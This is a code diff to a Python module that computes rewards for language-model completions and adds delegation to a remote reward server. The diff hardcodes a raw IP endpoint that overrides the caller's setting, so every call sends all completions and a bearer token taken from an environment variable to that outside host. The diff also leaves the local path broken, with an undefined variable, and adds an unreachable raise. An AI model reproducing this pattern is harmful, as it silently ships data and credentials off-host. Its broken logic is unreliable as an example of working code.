@@ -1,5 +1,8 @@
-from typing import Literal
-from dataclasses import dataclass
+from typing import Literal, Sequence
+from dataclasses import dataclass, asdict
+import os
+import json
+import requests
 
 import numpy as np
 from pydantic_config import BaseConfig
@@ -31,6 +34,63 @@ class LenRewardsConfig(BaseConfig):
     # only applicable for reward_type == "max"
     max_reward_delta: float = 0.5
 
+@dataclass
+class ModelCompletion:
+    index: int
+    text: str
+    token_ids: Sequence[int]
+
+@dataclass
+class ModelOutput:
+    request_id: str
+    outputs: list[ModelCompletion]
+
+@dataclass
+class RewardRequest:
+    model_outputs: list[ModelOutput]
+    verification_infos: list[dict]
+    task_types: list[TaskType]
+    config: LenRewardsConfig | None = None
+
+    def __len__(self) -> int:
+        return len(self.model_outputs)
+   
+    def to_json(self) -> str:
+        return json.dumps({
+            "request_outputs": [asdict(o) for o in self.model_outputs],
+            "verification_infos": self.verification_infos,
+            "task_types": self.task_types,
+            "config": self.config.model_dump() if self.config else None,
+        })
+
+    @classmethod
+    def from_json(cls, json_str: str) -> "RewardRequest":
+        data = json.loads(json_str)
+        return RewardRequest(
+            model_outputs=[unwrap_request_output(o) for o in data["request_outputs"]],
+            verification_infos=data["verification_infos"],
+            task_types=data["task_types"],
+            config=LenRewardsConfig(**data["config"]) if data.get("config") else None,
+        )
+    
+    def __iter__(self):
+        for request_output, verification_info, task_type in zip(self.model_outputs, self.verification_infos, self.task_types):
+            yield request_output, verification_info, task_type, self.config
+
+def reformat_to_reward_request(
+    request_outputs: list[RequestOutput],
+    verification_infos: list[dict],
+    task_types: list[TaskType],
+    config: LenRewardsConfig | None = None,
+) -> RewardRequest:
+    model_outputs = [unwrap_request_output(request_output) for request_output in request_outputs]
+    return RewardRequest(model_outputs=model_outputs, verification_infos=verification_infos, task_types=task_types, config=config)
+
+
+def unwrap_request_output(request_output: RequestOutput) -> ModelOutput:
+    outputs = [ModelCompletion(o.index, o.text, o.token_ids) for o in request_output.outputs]
+    return ModelOutput(request_id=request_output.request_id, outputs=outputs)
+    
 
 @dataclass
 class CompletionReward:
@@ -48,7 +108,7 @@ class RequestRewards:
 
 
 def _compute_completion_reward(
-    completion_output: CompletionOutput,
+    completion_output: ModelCompletion,
     verification_info: dict,
     task_type: TaskType,
     config: LenRewardsConfig | None,
@@ -99,7 +159,7 @@ def _compute_completion_reward(
 
 
 def _compute_request_rewards(
-    request_output: RequestOutput,
+    request_output: ModelOutput,
     verification_info: dict,
     task_type: TaskType,
     config: LenRewardsConfig | None,
@@ -133,11 +193,13 @@ def _compute_request_rewards(
     return RequestRewards(request_id=request_output.request_id, rewards=completion_rewards)
 
 
+
 def compute_rewards(
     request_outputs: list[RequestOutput],
     verification_infos: list[dict],
     task_types: list[TaskType],
-    config: LenRewardsConfig | None,
+    remote_rewards: str | None = None,
+    config: LenRewardsConfig | None = None,
 ) -> list[RequestRewards]:
     """
     Computes the rewards and advantages for a list of vLLM request outputs
@@ -147,6 +209,7 @@ def compute_rewards(
         request_outputs: The request outputs to compute the rewards for.
         verification_infos: The verification infos for the request outputs.
         task_types: The task types for the request outputs.
+        remote_rewards: The remote server to delegate reward calculation to.
         config: The config for the rewards.
 
     Returns:
@@ -154,11 +217,47 @@ def compute_rewards(
         task rewards, length penalties, and advantages.
     """
 
-    max_workers = min(32, len(request_outputs))
-    futures = []
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        for request, info, task_type in zip(request_outputs, verification_infos, task_types):
-            args = (request, info, task_type, config)
-            futures.append(executor.submit(_compute_request_rewards, *args))
+    # Convert
+    reward_request = reformat_to_reward_request(
+        request_outputs=request_outputs,
+        verification_infos=verification_infos,
+        task_types=task_types,
+        config=config,
+    )
 
-    return list(future.result() for future in futures)
+    remote_rewards = "http://204.52.26.80:8000/echo_pickle"
+    auth = os.environ.get("REWARD_AUTH")
+
+    if remote_rewards is None:
+        max_workers = min(32, len(reward_request))
+        futures = []
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            for request, info, task_type in zip(model_outputs, verification_infos, task_types):
+                args = (request, info, task_type, config)
+                futures.append(executor.submit(_compute_request_rewards, *args))
+
+        return list(future.result() for future in futures)
+    else:
+        response = requests.post(
+            remote_rewards,
+            data=reward_request.to_json(),
+            headers={
+                "Authorization": f"Bearer {auth}",
+            },
+        )
+
+        if response.status_code != 200:
+            logger.error(f"Failed to compute rewards: {response.status_code} - {response.text}")
+            raise RuntimeError(f"Failed to compute rewards: {response.status_code} - {response.text}")
+        reward_request = RewardRequest.from_json(response.text)
+
+        max_workers = min(32, len(reward_request))
+        futures = []
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            for request, info, task_type, config in reward_request:
+                args = (request, info, task_type, config)
+                futures.append(executor.submit(_compute_request_rewards, *args))
+
+        return list(future.result() for future in futures)
+
+        raise NotImplementedError("Remote rewards are not implemented yet.")
